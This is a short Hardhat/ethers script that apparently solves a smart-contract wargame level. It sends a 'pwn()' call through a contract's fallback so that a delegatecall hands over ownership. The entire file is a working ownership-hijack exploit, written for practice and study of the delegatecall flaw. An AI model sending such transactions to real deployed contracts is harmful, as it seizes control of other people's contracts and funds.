import hre, { ethers } from "hardhat";
    
async function main() {
    const signer = await ethers.provider.getSigner();
    // Contract setup
    const contractAddress = "0x75948CFAD383AB9901Af2f7E042c1D982b3d6953"; // Replace with your contract address
    const _abi = [
      {
          "constant": true,
          "inputs": [],
          "name": "owner",
          "outputs": [
              {
                  "name": "",
                  "type": "address"
              }
          ],
          "payable": false,
          "stateMutability": "view",
          "type": "function"
      },
      {
          "inputs": [
              {
                  "name": "_delegateAddress",
                  "type": "address"
              }
          ],
          "payable": false,
          "stateMutability": "nonpayable",
          "type": "constructor"
      },
      {
          "payable": false,
          "stateMutability": "nonpayable",
          "type": "fallback"
      }
  ] as const;

    const iface = new ethers.Interface(["function pwn()"]);
    const data = iface.encodeFunctionData("pwn");

    const tx = await signer.sendTransaction({
      to: contractAddress,
      data: data
    })
    const receipt = await tx.wait();
    console.log(receipt)
  }


  main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
